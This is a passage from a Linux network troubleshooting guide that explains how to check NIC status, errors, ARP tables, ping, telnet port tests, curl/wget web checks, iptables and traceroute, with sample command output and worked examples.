        BROADCAST MULTICAST  MTU:1500  Metric:1
        RX packets:2924 errors:0 dropped:0 overruns:0 frame:0
        TX packets:2287 errors:0 dropped:0 overruns:0 carrier:0
        collisions:0 txqueuelen:100
        RX bytes:180948 (176.7 Kb)  TX bytes:166377 (162.4 Kb)
        Interrupt:10 Memory:c88b5000-c88b6000


    Active Interface 

wlan0    Link encap:Ethernet  HWaddr 00:06:25:09:6A:D7
         inet addr:216.10.119.243  Bcast:216.10.119.255
         UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
         RX packets:2924 errors:0 dropped:0 overruns:0 frame:0
         TX packets:2295 errors:0 dropped:0 overruns:0 carrier:0
         collisions:0 txqueuelen:100
         RX bytes:180948 (176.7 Kb)  TX bytes:166521 (162.6 Kb)
         Interrupt:10 Memory:c88b5000-c88b6000

DHCP Considerations

DHCP clients automatically give their NICs and IP address starting with 169.254.x.x until they can make contact with their DHCP server. When contact is made they reconfigure their IP addresses to the values provided by the DHC server. An interface with a 169.254.x.x address signifies a failure to communicate with the DHCP server. Check your cabling, routing and DHCP server configuration to rectify such a problem.
Testing Link Status from the Command Line

Both the mii-tool and ethtool commands command will provide reports on the link status and duplex settings for supported NICs.

When used without any switches, the mii-tool gives a very brief report. Use it with the -v switch because it provides more information on the supported autonegotiation speeds of the NIC and this can be useful in troubleshooting speed and duplex issues.

The ethtool command provides much more information than mii-tool and should be your command of choice, especially because mii-tool will be soon deprecated in Linux. In both of the following examples the NICs are operating at 100Mbps, full duplex and the link is ok.


Link Status Output from mii-tool

[root@bigboy tmp]# mii-tool -v

eth0: 100 Mbit, full duplex, link ok
  product info: Intel 82555 rev 4
  basic mode:   100 Mbit, full duplex
  basic status: link ok
  capabilities: 100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD
  advertising:  100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD flow-control
  link partner: 100baseTx-HD

[root@bigboy tmp]#

Link Status Output from ethtool

[root@bigboy tmp]# ethtool eth0

Settings for eth0:
        Supported ports: [ TP MII ]
        Supported link modes:   10baseT/Half 10baseT/Full
                                100baseT/Half 100baseT/Full
        Supports auto-negotiation: Yes
        Advertised link modes:  10baseT/Half 10baseT/Full
                                100baseT/Half 100baseT/Full
        Advertised auto-negotiation: No
        Speed: 100Mb/s
        Duplex: Full
        Port: MII
        PHYAD: 1
        Transceiver: internal
        Auto-negotiation: off
        Supports Wake-on: g
        Wake-on: g
        Current message level: 0x00000007 (7)
        Link detected: yes
[root@bigboy tmp]#


Viewing NIC Errors

Errors are a common symptom of slow connectivity due to poor configuration or excessive bandwidth utilization. They should always be corrected whenever possible. Error rates in excess of 0.5% can result in noticeable sluggishness.


Ifconfig Error Output

The ifconfig command also shows the number of overrun, carrier, dropped packet and frame errors.


wlan0     Link encap:Ethernet  HWaddr 00:06:25:09:6A:D7
          BROADCAST MULTICAST  MTU:1500  Metric:1
          RX packets:2924 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2287 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:100
          RX bytes:180948 (176.7 Kb)  TX bytes:166377 (162.4 Kb)
          Interrupt:10 Memory:c88b5000-c88b6000

ethtool Error Output

The ethtool command can provide a much more detailed report when used with the -S switch.

[root@probe-001 root]# ethtool -S eth0
NIC statistics:
     rx_packets: 1669993
     tx_packets: 627631
     rx_bytes: 361714034
     tx_bytes: 88228145
     rx_errors: 0
     tx_errors: 0
     rx_dropped: 0
     tx_dropped: 0
     multicast: 0
     collisions: 0
     rx_length_errors: 0
     rx_over_errors: 0
     rx_crc_errors: 0
     rx_frame_errors: 0
     rx_fifo_errors: 0
     rx_missed_errors: 0
     tx_aborted_errors: 0
     tx_carrier_errors: 0
     tx_fifo_errors: 0
     tx_heartbeat_errors: 0
     tx_window_errors: 0
     tx_deferred: 0
     tx_single_collisions: 0
     tx_multi_collisions: 0
     tx_flow_control_pause: 0
     rx_flow_control_pause: 0
     rx_flow_control_unsupported: 0
     tx_tco_packets: 0
     rx_tco_packets: 0
[root@probe-001 root]#

netstat Error Output

The netstat command is very versatile and can provide a limited report when used with the -i switch. This is useful for systems where mii-tool or ethtool are not available.

[root@bigboy tmp]# netstat -i
Kernel Interface table
Iface       MTU Met    RX-OK RX-ERR RX-DRP RX-OVR    TX-OK TX-ERR TX-DRP TX-OVR Flg
eth0       1500   0 18976655      2      0      0 21343152    142      0      3 BMRU
eth1       1500   0   855154      0      0      0 15196620      0      0      0 BMRU
lo        16436   0  1784272      0      0      0  1784272      0      0      0 LRU
[root@bigboy tmp]#

Possible Causes of Ethernet Errors

Collisions: Signifies when the NIC card detects itself and another server on the LAN attempting data transmissions at the same time. Collisions can be expected as a normal part of Ethernet operation and are typically below 0.1% of all frames sent. Higher error rates are likely to be caused by faulty NIC cards or poorly terminated cables.

Single Collisions: The Ethernet frame went through after only one collision

Multiple Collisions: The NIC had to attempt multiple times before successfully sending the frame due to collisions.

CRC Errors: Frames were sent but were corrupted in transit. The presence of CRC errors, but not many collisions usually is an indication of electrical noise. Make sure that you are using the correct type of cable, that the cabling is undamaged and that the connectors are securely fastened.

Frame Errors: An incorrect CRC and a non-integer number of bytes are received. This is usually the result of collisions or a bad Ethernet device.

FIFO and Overrun Errors: The number of times that the NIC was unable of handing data to its memory buffers because the data rate the capabilities of the hardware. This is usually a sign of excessive traffic.

Length Errors: The received frame length was less than or exceeded the Ethernet standard. This is most frequently due to incompatible duplex settings.

Carrier Errors: Errors are caused by the NIC card losing its link connection to the hub or switch. Check for faulty cabling or faulty interfaces on the NIC and networking equipment.

	10.2.18.3 How to See MAC Addresses

There are times when you lose connectivity with another server that is directly connected to your local network. Taking a look at the ARP table of the server from which you are troubleshooting will help determine whether the remote server's NIC is responding to any type of traffic from your Linux box. Lack of communication at this level may mean:

    Either server might be disconnected from the network.
    There might be bad network cabling.
    A NIC might be disabled or the remote server might be shut down
    The remote server might be running firewall software such as iptables or the Windows XP built in firewall. Typically in this case, you can see the MAC address, the server is running the correct software, but the desired communication doesn't appear to be occurring to the client on the same network. 

Here is a description of the commands you may use to determine ARP values:

    The ifconfig -a command shows you both the NIC's MAC address and the associated IP addresses of the server that you are currently logged in to. Here you can see the wlan0 interface has two IP addresses 192.168.1.100 and 192.168.1.99 tied to the NIC hardware MAC address of 00:06:25:09:6A:B5 

[root@bigboy tmp]# ifconfig -a

wlan0 Link encap:Ethernet HWaddr 00:06:25:09:6A:B5
inet addr:192.168.1.100 Bcast:192.168.1.255 Mask:255.255.255.0
UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1
RX packets:47379 errors:0 dropped:0 overruns:0 frame:0
TX packets:107900 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:100
RX bytes:4676853 (4.4 Mb) TX bytes:43209032 (41.2 Mb)
Interrupt:11 Memory:c887a000-c887b000

wlan0:0 Link encap:Ethernet HWaddr 00:06:25:09:6A:B5
inet addr:192.168.1.99 Bcast:192.168.1.255 Mask:255.255.255.0
UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1
Interrupt:11 Memory:c887a000-c887b000 

[root@bigboy tmp]#


    The arp -a command will show you the MAC addresses in your server's ARP table and all the other servers on the directly connected network. Here we see we have some form of connectivity with the router at address 192.168.1.1 

 [root@bigboy tmp]# arp -a
bigboypix (192.168.1.1) at 00:09:E8:9C:FD:AB [ether] on wlan0
? (192.168.1.101) at 00:06:25:09:6A:D7 [ether] on wlan0
[root@bigboy tmp]#

    Note: Make sure the IP addresses listed in the ARP table match those of servers expected to be on your network. If they don't, your server might be plugged into the wrong switch or router port. 

    You should also check the ARP table of the remote server to see whether it is populated with acceptable values. 

	10.2.18.4 Using ping to Test Network Connectivity

Whether or not your troublesome server is connected to your local network it is always a good practice to force a response from it.

One of the most common methods used to test connectivity across multiple networks is the ping command. ping sends ICMP echo packets that request a corresponding ICMP echo-reply response from the device at the target address. Because most servers will respond to a ping query it becomes a very handy tool. A lack of response could be due to:

    A server with that IP address doesn't exist
    The server has been configured not to respond to pings
    A firewall or router along the network path is blocking ICMP traffic
    You have incorrect routing. Check the routes and subnet masks on both the local and remote servers and all routers in between. A classic symptom of bad routes on a server is the ability to ping servers only on your local network and nowhere else. Use traceroute to ensure you're taking the correct path.
    Either the source or destination device having an incorrect IP address or subnet mask. 

There are a variety of ICMP response codes which can help in further troubleshooting. See Appendix I, "Miscellaneous Linux Topics", for a full listing of them.

The Linux ping command will send continuous pings, once a second, until stopped with a Ctrl-C. Here is an example of a successful ping to the server bigboy at 192.168.1.100


[root@smallfry tmp]# ping 192.168.1.101

PING 192.168.1.101 (192.168.1.101) from 192.168.1.100 : 56(84) bytes of data.
64 bytes from 192.168.1.101: icmp_seq=1 ttl=128 time=3.95 ms
64 bytes from 192.168.1.101: icmp_seq=2 ttl=128 time=7.07 ms
64 bytes from 192.168.1.101: icmp_seq=3 ttl=128 time=4.46 ms
64 bytes from 192.168.1.101: icmp_seq=4 ttl=128 time=4.31 ms

--- 192.168.1.101 ping statistics ---
4 packets transmitted, 4 received, 0% loss, time 3026ms
rtt min/avg/max/mdev = 3.950/4.948/7.072/1.242 ms

[root@smallfry tmp]#

You may get a "Destination Host Unreachable" message. There message is caused by your router or server knowing that the target IP address is part of a valid network, but is getting no response from the target server. There are a number of reasons for this:


If you are trying to ping a host on a directly connected network:

    The client or server might be down, or disconnected for the network.
    Your NIC might not have the correct duplex settings; you may verify this with the mii-tool command.
    You might have the incorrect type of cable connecting your Linux box to the network. There are two basic types, straight through and crossover.
    In the case of a wireless network, your SSID or encryption keys might be incorrect. 


If you are trying to ping a host on remote network:

The network device doesn't have a route in its routing table to the destination network and sends an ICMP reply type 3 which triggers the message. The resulting message might be Destination Host Unreachable or Destination Network Unreachable.

[root@smallfry tmp]# ping 192.168.1.105
PING 192.168.1.105 (192.168.1.105) from 192.168.1.100 : 56(84) bytes of data.
From 192.168.1.100 icmp_seq=1 Destination Host Unreachable
From 192.168.1.100 icmp_seq=2 Destination Host Unreachable
From 192.168.1.100 icmp_seq=3 Destination Host Unreachable
From 192.168.1.100 icmp_seq=4 Destination Host Unreachable
From 192.168.1.100 icmp_seq=5 Destination Host Unreachable
From 192.168.1.100 icmp_seq=6 Destination Host Unreachable
--- 192.168.1.105 ping statistics ---
8 packets transmitted, 0 received, +6 errors, 100% loss, time 7021ms, pipe 3
[root@smallfry tmp]#

	10.2.18.5 Using telnet to Test Network Connectivity

An easy way to tell if a remote server is listening on a specific TCP port is to use the telnet command. By default, telnet will try to connect on TCP port 23, but you can specify other TCP ports by typing them in after the target IP address. HTTP uses TCP port 80, HTTPS uses port 443.

Here is an example of testing server 192.168.1.102 on the TCP port 22 reserved for SSH:

[root@bigboy tmp]# telnet 192.168.1.102 22

When using telnet troubleshooting, here are some useful guidelines to follow that will help to isolate the source of the problem:

    Test connectivity from the remote PC or server.
    Test connectivity on the server itself. Try making the connection to the loopback address as well as the NIC IP address. If the server is running a firewall package such as the Linux iptables software, all loopback connectivity is allowed, but connectivity to desired TCP ports on the NIC interface might be blocked sometimes. Further discussion of the Linux iptables package is covered in a later section.
    Test connectivity from another server on the same network as the target server. This helps to eliminate the influence of any firewalls protecting the entire network from outside. 


Linux telnet Troubleshooting

The following sections the use of telnet troubleshooting from a Linux box.

Note: Always remember that many Linux servers have the iptables firewall package installed by default. This is often the cause of many connectivity problems and the firewall rules should be correctly updated. In some cases where the network is already protected by a firewall, iptables might be safely turned off. You can use the /etc/init.d/iptables status command on the target server to determine whether iptables is running.


Successful Connection

With Linux a successful telnet connection is always greeted by a Connected to message like the one seen below when trying to test connectivity to server 192.168.1.102 on the SSH port (TCP 22).

[root@bigboy tmp]# telnet 192.168.1.102 22
Trying 192.168.1.102...
Connected to 192.168.1.102. 
Escape character is '^]'.
SSH-1.99-OpenSSH_3.4p1
^]
telnet> quit
Connection closed.
[root@ bigboy tmp]#

To break out of the connection you have to press the Ctrl and ] keys simultaneously, not the usual Ctrl-C.

Note: In many cases you can successfully connect on the remote server on the desired TCP port, yet the application doesn't appear to work. This is usually caused by there being correct network connectivity but a poorly configured application.


Connection Refused Messages

You will get a connection refused message for one of the following reasons:

    The application you are trying to test hasn't been started on the remote server.
    There is a firewall blocking and rejecting the connection attempt 

Here is some sample output:

[root@bigboy tmp]# telnet 192.168.1.100 22
Trying 192.168.1.100...
telnet: connect to address 192.168.1.100: Connection refused
[root@bigboy tmp]#


telnet Timeout or Hanging

The telnet command will abort the attempted connection after waiting a predetermined time for a response. This is called a timeout. In some cases, telnet won't abort, but will just wait indefinitely. This is also known as hanging. These symptoms can be caused by the one of the following reasons:

    The remote server doesn't exist on the destination network. It could be turned off.
    A firewall could be blocking and not rejecting the connection attempt, causing it to timeout instead of being quickly refused. 

[root@bigboy tmp]# telnet 216.10.100.12 22
Trying 216.10.100.12...
telnet: connect to address 216.10.100.12: Connection timed out
[root@bigboy tmp]#


telnet Troubleshooting Using Windows

Sometimes you have to troubleshoot Linux servers from a Windows PC. The telnet commands are the same, but the results are different. Go to the command line and type the same telnet command as you would in Linux.


Screen Goes Blank - Successful Connection

If there is connectivity, your command prompt screen will go blank. Using the Ctrl-C key sequence enables you to exit the telnet attempt.


"Connect Failed" Messages

The Connect failed messages are the equivalent of the Linux Connection refused messages explained above and are caused for the same reasons.

C:\>telnet 172.16.1.102 256
Connecting To 172.16.1.102...Could not open connection to the host, on port 256:
Connect failed
C:\>


telnet Timeout or Hanging

As explained previously, if there is no connectivity, the session will appear to hang or timeout. This is usually caused by the target server being turned off or by a firewall blocking the connection.

C:\>telnet 216.10.100.12 22
Connecting To 216.10.100.12...

	10.2.18.6 Testing Web sites with the curl and wget Utilities

Testing a Web site's performance using a Web browser alone is sometimes insufficient to get a good idea of the source of slow Web server performance. Many useful HTTP error codes are often not displayed by browsers making troubleshooting difficult. A much better combination of tools is to use telnet to test your site's TCP port 80 response time in conjunction with data from the Linux curl and wget HTTP utilities.

Rapid TCP response times, but slow curl and wget response times usually point, not to a network issue, but to slowness in the configuration of the Web server or any supporting application or database servers it may use to generate the Web page.


Using curl

The curl utility acts like a text based Web browser in which you can select to see either the header or complete body of a Web page's HTML code displayed on your screen.

A good start is to use the curl command with the -I flag to view just the Web page's header and HTTP status code. By not using the -I command you will see all the Web page's HTML code displayed on the screen. Either method can provide a good idea of your server's performance.

[root@ bigboy tmp]# curl -I www.linuxhomenetworking.com
HTTP/1.1 200 OK
Date: Tue, 19 Oct 2004 05:11:22 GMT
Server: Apache/2.0.51 (Fedora)
Accept-Ranges: bytes
Vary: Accept-Encoding,User-Agent
Connection: close
Content-Type: text/html; charset=UTF-8
[root@bigboy tmp]#

In this case the Web server appears to be working correctly because it returns a 200 OK code. Please refer to Chapter 20, "The Apache Web Server", for a more complete listing of possibilities.
Using wget

You can use wget to recursively download a Web site's Web pages, including the entire directory structure of the Web site, to a local directory.

By not using recursion, and activating the timestamping feature (the -N switch), you view not only the HTML content of the Web site's index page in your local directory, but also the download speed, file size and precise start and stop times for the download. This can be very helpful in providing a simple way to obtain snapshots of your server's performance.


[root@bigboy tmp]# wget -N www.linuxhomenetworking.com
--23:07:22--  http://www.linuxhomenetworking.com/
           => `index.html'
Resolving www.linuxhomenetworking.com... done.
Connecting to www.linuxhomenetworking.com[65.115.71.34]:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Last-modified header missing -- time-stamps turned off.
--23:07:22--  http://www.linuxhomenetworking.com/
           => `index.html'
Connecting to www.linuxhomenetworking.com[65.115.71.34]:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
 
   [   <=>                                         ] 122,150      279.36K/s

23:07:22 (279.36 KB/s) - `index.html' saved [122150]
[root@bigboy tmp]#

	10.2.18.7 The netstat Command

Like curl and wget, netstat can be very useful in helping to determine the source of problems. Using netstat, with the -an option lists all the TCP ports on which your Linux server is listening including all the active network connections to and from your server. This can be very helpful in determining whether slowness is due to high traffic volumes:

[root@bigboy tmp]# netstat -an
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN
tcp        0      0 :::80                   :::*                    LISTEN
tcp        0   1124 ::ffff:65.115.71.34:80 ::ffff:24.4.97.110:2955  ESTABLISHED
...
...
...
[root@bigboy tmp]#

Most TCP connections create permanent connections, HTTP is different because the connections are shut down on their own after a pre defined inactive timeout or time_wait period on the Web server. It is therefore a good idea to focus on these types of short-lived connections too. You can determine the number of established and time_wait TCP connections on your server by using the netstat command filtered by the grep and egrep commands, with the number of matches being counted by the wc command which, in this case shows 14 connections.

[root@bigboy tmp]# netstat -an | grep tcp | egrep -i 'established|time_wait' | wc -l
14
[root@bigboy tmp]#

	10.2.18.8 The Linux iptables Firewall

An unexpected source of server connectivity issues for brand new servers is frequently the iptables firewall. This is installed by default under Fedora and RedHat and usually allows only a limited range of traffic. You may want to try stopping iptables while you troubleshoot.

Managing iptables is easy to do, but the procedure differs between Linux distributions. Here are some things to keep in mind.

    Firstly, different Linux distributions use different daemon management systems. Each system has its own set of commands to do similar operations. The most commonly used daemon management systems are SysV and Systemd.
    Secondly, the daemon name needs to be known. In the case of iptables the name is iptables. 

Armed with this information you can know how to:

    Start your daemons automatically on booting
    Stop, start and restart them later on during troubleshooting or when a configuration file change needs to be applied. 

For more details on this, please take a look at the "Managing Daemons" section of Chapter 6 "Installing Linux Software"
How to Configure iptables Rules

Stopping iptables may not be a good permanent solution especially if your network isn't protected by a firewall. You can read more about configuring iptables from Chapter 14, "Linux Firewalls Using iptables".
	10.2.18.9 Using traceroute to Test Connectivity

Another tool for network troubleshooting is the traceroute command. It gives a listing of all the router hops between your server and the target server. This helps you verify that routing over the networks in between is correct.

The traceroute command works by sending a UDP packet destined to the target with a TTL of 0. The first router on the route recognizes that the TTL has already been exceeded and discards or drops the packet, but also sends an ICMP time exceeded message back to the source. The traceroute program records the IP address of the router that sent the message and knows that that is the first hop on the path to the final destination. The traceroute program tries again, with a TTL of 1. The first hop, sees nothing wrong with the packet, decrements the TTL to 0 as expected, and forwards the packet to the second hop on the path. Router 2, sees the TTL of 0, drops the packet and replies with an ICMP time exceeded message. traceroute now knows the IP address of the second router. This continues around and around until the final destination is reached.

    Note: In Linux the traceroute command is traceroute. In Windows it is tracert. 

    Note: You will receive traceroute responses only from functioning devices. If a device responds it is less likely to be the source of your problems. 


Sample traceroute Output

Here is a sample output for a query to 144.232.20.158. Notice that all the hop times are under 50 milliseconds (ms) which is acceptable.

[root@bigboy tmp]# traceroute -I 144.232.20.158

traceroute to 144.232.20.158 (144.232.20.158), 30 hops max, 38 byte packets
1 adsl-67-120-221-110.dsl.sntc01.pacbell.net (67.120.221.110) 14.408 ms 14.064 ms 13.111 ms
2 dist3-vlan50.sntc01.pbi.net (63.203.35.67) 13.018 ms 12.887 ms 13.146 ms
3 bb1-g1-0.sntc01.pbi.net (63.203.35.17) 12.854 ms 13.035 ms 13.745 ms
4 bb2-p11-0.snfc21.pbi.net (64.161.124.246) 16.260 ms 15.618 ms 15.663 ms
5 bb1-p14-0.snfc21.pbi.net (64.161.124.53) 15.897 ms 15.785 ms 17.164 ms
6 sl-gw11-sj-3-0.sprintlink.net (144.228.44.49) 14.443 ms 16.279 ms 15.189 ms
7 sl-bb25-sj-6-1.sprintlink.net (144.232.3.133) 16.185 ms 15.857 ms 15.423 ms
8 sl-bb23-ana-6-0.sprintlink.net (144.232.20.158) 27.482 ms 26.306 ms 26.487 ms
[root@bigboy tmp]#


Possible traceroute Messages

There are a number of possible message codes traceroute can give, these are listed in Table 4-1.


Table 4-1: traceroute Return Code Symbols
Traceroute Symbol 	Description
*** 	

Expected 5 second response time exceeded. Could be caused by:

    A router on the path not sending back the ICMP "time exceeded" messages
    A router or firewall in the path blocking the ICMP "time exceeded" messages
    The target IP address not responding 

!H, !N, or !P 	Host, network or protocol unreachable
!X or !A 	Communication administratively prohibited. A router Access Control List (ACL) or firewall is in the way
!S 	Source route failed. Source routing attempts to force traceroute to use a certain path. Failure might be due to a router security setting
traceroute Time Exceeded False Alarms

If there is no response within a 5-second timeout interval an asterisk (*) is printed for that probe as seen in the following example.

[root@bigboy tmp]# traceroute 144.232.20.158
traceroute to 144.232.20.158 (144.232.20.158), 30 hops max, 38 byte packets
1 adsl-67-120-221-110.dsl.sntc01.pacbell.net (67.120.221.110) 14.304 ms 14.019 ms 16.120 ms
2 dist3-vlan50.sntc01.pbi.net (63.203.35.67) 12.971 ms 14.000 ms 14.627 ms
3 bb1-g1-0.sntc01.pbi.net (63.203.35.17) 15.521 ms 12.860 ms 13.179 ms
4 bb2-p11-0.snfc21.pbi.net (64.161.124.246) 13.991 ms 15.842 ms 15.728 ms
5 bb1-p14-0.snfc21.pbi.net (64.161.124.53) 16.133 ms 15.510 ms 15.909 ms
6 sl-gw11-sj-3-0.sprintlink.net (144.228.44.49) 16.510 ms 17.469 ms 18.116 ms
7 sl-bb25-sj-6-1.sprintlink.net (144.232.3.133) 16.212 ms 14.274 ms 15.926 ms
8 * * *
9 * * *
[root@bigboy tmp]#

Some devices will prevent traceroute packets directed at their interfaces, but will allow ICMP packets. Using traceroute with a -I flag forces traceroute to use ICMP packets that may go through. In this case the * * *, status messages disappear:

[root@bigboy tmp]# traceroute -I 144.232.20.158
traceroute to 144.232.20.158 (144.232.20.158), 30 hops max, 38 byte packets
1 adsl-67-120-221-110.dsl.sntc01.pacbell.net (67.120.221.110) 14.408 ms 14.064 ms 13.111 ms
2 dist3-vlan50.sntc01.pbi.net (63.203.35.67) 13.018 ms 12.887 ms 13.146 ms
3 bb1-g1-0.sntc01.pbi.net (63.203.35.17) 12.854 ms 13.035 ms 13.745 ms
4 bb2-p11-0.snfc21.pbi.net (64.161.124.246) 16.260 ms 15.618 ms 15.663 ms
5 bb1-p14-0.snfc21.pbi.net (64.161.124.53) 15.897 ms 15.785 ms 17.164 ms
6 sl-gw11-sj-3-0.sprintlink.net (144.228.44.49) 14.443 ms 16.279 ms 15.189 ms
7 sl-bb25-sj-6-1.sprintlink.net (144.232.3.133) 16.185 ms 15.857 ms 15.423 ms
8 sl-bb23-ana-6-0.sprintlink.net (144.232.20.158) 27.482 ms 26.306 ms 26.487 ms
[root@bigboy tmp]#


traceroute Internet Slowness False Alarm

The following traceroute gives the impression that a Web site at 80.40.118.227 might be slow because there is congestion along the way at hops 6 and 7 where the response time is over 200ms:

C:\>tracert 80.40.118.227
  1     1 ms     2 ms     1 ms  66.134.200.97
  2    43 ms    15 ms    44 ms  172.31.255.253
  3    15 ms    16 ms     8 ms  192.168.21.65
  4    26 ms    13 ms    16 ms  64.200.150.193
  5    38 ms    12 ms    14 ms  64.200.151.229
  6   239 ms   255 ms   253 ms  64.200.149.14
  7   254 ms   252 ms   252 ms  64.200.150.110
  8    24 ms    20 ms    20 ms  192.174.250.34
  9    91 ms    89 ms    60 ms  192.174.47.6
 10    17 ms    20 ms    20 ms  80.40.96.12
 11    30 ms    16 ms    23 ms  80.40.118.227
Trace complete.
C:\>

This indicates only that the devices on hops 6 and 7 were slow to respond with ICMP TTL exceeded messages, but not and indication of congestion, latency, or packet loss. If any of those conditions existed all points past the problematic link would show high latency.

Many Internet routing devices give very low priority to traffic related to traceroute in favor of revenue generating traffic.


traceroute Dies At The Router Just Before The Server

In this case the last device to respond to the traceroute just happens to be the router that acts as the default gateway of the server. The problem is not with the router, but with the server. Remember, you will only receive traceroute responses from functioning devices.

Possible causes of this problem include the following:

    A server has a bad default gateway
    The server is running some type of firewall software that blocks traceroute
    The server is shut down, or disconnected from the network, or it has an incorrectly configured NIC. 

C:\>tracert 80.40.100.18

Tracing route to 80.40.100.18 over a maximum of 30 hops
 1    33 ms    49 ms    28 ms  192.168.1.1
 2    33 ms    49 ms    28 ms  65.14.65.19
 3    33 ms    32 ms    32 ms  81.25.68.252
 4    47 ms    32 ms    31 ms  80.40.97.1
 5    29 ms    28 ms    32 ms  80.40.96.114
 6     *        *        *     Request timed out.
 7  ^C
C:\>


Always Get a Bidirectional traceroute

It is always best to get a traceroute from the source IP to the target IP and also from the target IP to the source IP. This is because the packet's return path from the target is sometimes not the same as the path taken to get there. A high traceroute time equates to the round trip time for both the initial traceroute query to each hop and the response of each hop.

Here is an example of one such case, using disguised IP addresses and provider names. There was once a routing issue between telecommunications carriers FastNet and SlowNet. When a user at IP address 40.16.106.32 did a traceroute to 64.25.175.200, a problem seemed to appear at the 10th. hop with OtherNet. However, when a user at 64.25.175.200 did a traceroute to 40.16.106.32, latency showed up at hop 7 with the return path being very different.

In this case, the real traffic congestion was occurring where FastNet handed off traffic to SlowNet in the second trace. The latency appeared to be caused at hop 10 on the first trace not because that hop was slow, but because that was the first hop at which the return packet traveled back to the source via the congested route. Remember, traceroute gives the packet round trip time.

Trace route to 40.16.106.32 from 64.25.175.200


1  0    ms 0    ms 0    [64.25.175.200]
2  0    ms 0    ms 0    [64.25.175.253]
3  0    ms 0    ms 0    border-from-40-tesser.boulder.co.coop.net [207.174.144.169]
4  0    ms 0    ms 0    [64.25.128.126]
5  0    ms 0    ms 0    p3-0.dnvtco1-cr3.othernet.net [4.25.26.53]
6  0    ms 0    ms 0    p2-1.dnvtco1-br1.othernet.net [4.24.11.25]
7  0    ms 0    ms 0    p15-0.dnvtco1-br2.othernet.net [4.24.11.38]
8  30   ms 30   ms 30   p15-0.snjpca1-br2.othernet.net [4.0.6.225]
9  30   ms 30   ms 30   p1-0.snjpca1-cr4.othernet.net [4.24.9.150]
10 1252 ms 1212 ms 1202 h0.webhostinc2.othernet.net [4.24.236.38]
11 1252 ms 1212 ms 1192 [40.16.96.11]
12 1262 ms 1212 ms 1192 [40.16.96.162]
13 1102 ms 1091 ms 1092 [40.16.106.32]

Trace route to 64.25.175.200 from 40.16.106.32

1  1    ms 1    ms 1    ms [40.16.106.3]
2  1    ms 1    ms 1    ms [40.16.96.161]
3  2    ms 1    ms 1    ms [40.16.96.2]
4  1    ms 1    ms 1    ms [40.16.96.65]
5  2    ms 2    ms 1    ms border8.p4-2.webh02-1.sfj.fastnet.net [216.52.19.77]
6  2    ms 1    ms 1    ms core1.ge0-1-net2.sfj.fastnet.net [216.52.0.65]
7  993  ms 961  ms 999  ms sjo-edge-03.inet.slownet.net [208.46.223.33]
8  1009 ms 1008 ms 971  ms sjo-core-01.inet.slownet.net [205.171.22.29]
9  985  ms 947  ms 983  ms svl-core-03.inet.slownet.net [205.171.5.97]
10 1028 ms 1010 ms 953  ms [205.171.205.30]
11 989  ms 988  ms 985  ms p4-3.paix-bi1.othernet.net [4.2.49.13]
12 1002 ms 1001 ms 973  ms p6-0.snjpca1-br1.othernet.net [4.24.7.61]
13 1031 ms 989  ms 978  ms p9-0.snjpca1-br2.othernet.net [4.24.9.130]
14 1031 ms 1017 ms 1017 ms p3-0.dnvtco1-br2.othernet.net [4.0.6.226]
15 1027 ms 1025 ms 1023 ms p15-0.dnvtco1-br1.othernet.net [4.24.11.37]
16 1045 ms 1037 ms 1050 ms p1-0.dnvtco1-cr3.othernet.net [4.24.11.26]
17 1030 ms 1020 ms 1045 ms p0-0.cointcorp.othernet.net [4.25.26.54]
18 1038 ms 1031 ms 1045 ms gw234.boulder.co.coop.net [64.25.128.99]
19 1050 ms 1094 ms 1034 ms [64.25.175.253]
20 1050 ms 1094 ms 1034 ms [64.25.175.200]


ping and traceroute Troubleshooting Example

In this example, a ping to 186.9.17.153 gave a TTL timeout message. Ping TTLs will usually timeout only if there is a routing loop in which the packet bounces between two routers on the way to the target. Each bounce causes the TTL to decrease by a count of 1 until the TTL reaches 0 at which point you get the timeout.

The routing loop was confirmed by the traceroute in which the packet was proven to be bouncing between routers at 186.40.64.94 and 186.40.64.93:

G:\>ping 186.9.17.153

Pinging 186.9.17.153 with 32 bytes of data:

Reply from 186.40.64.94: TTL expired in transit.
Reply from 186.40.64.94: TTL expired in transit.
Reply from 186.40.64.94: TTL expired in transit.
Reply from 186.40.64.94: TTL expired in transit.

Ping statistics for 186.9.17.153:
  Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),

Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum =  0ms, Average =  0ms

G:\>tracert 186.9.17.153

Tracing route to lostserver.confusion.net [186.9.17.153]

over a maximum of 30 hops:
 1   <10 ms   <10 ms   <10 ms  186.217.33.1
 2    60 ms    70 ms    60 ms  rtr-2.confusion.net [186.40.64.94]
 3    70 ms    71 ms    70 ms  rtr-1.confusion.net [186.40.64.93]
 4    60 ms    70 ms    60 ms  rtr-2.confusion.net [186.40.64.94]
 5    70 ms    70 ms    70 ms  rtr-1.confusion.net [186.40.64.93]
 6    60 ms    70 ms    61 ms  rtr-2.confusion.net [186.40.64.94]
 7    70 ms    70 ms    70 ms  rtr-1.confusion.net [186.40.64.93]
 8    60 ms    70 ms    60 ms  rtr-2.confusion.net [186.40.64.94]
 9    70 ms    70 ms    70 ms  rtr-1.confusion.net [186.40.64.93]
...
...
...
Trace complete.
G:\>

This problem was solved by resetting the routing process on both routers. The problem was initially triggered by an unstable network link that caused frequent routing recalculations. The constant activity eventually corrupted the routing tables of one of the routers.
traceroute Web sites

Many ISPs will provide their subscribers with the facility to do a traceroute from purpose built servers called looking glasses. A simple web search for the phrase Internet looking glass will provide a long list of alternatives. Doing a traceroute form a variety of locations can help identify whether the problem is with the ISP of your Web server or the ISP used at home/work to provide you with Internet access. A more convenient way of doing this is to use a site like traceroute.org which provides a list of looking glasses sorted by country.


Possible Reasons For Failed Traceroutes

A traceroute can fail to reach its intended destination for a number of reasons, including the following:

    traceroute packets are being blocked or rejected by a router in the path. The router immediately after the last visible one is usually the culprit. It's usually good to check the routing table and/or other status of this next hop device.
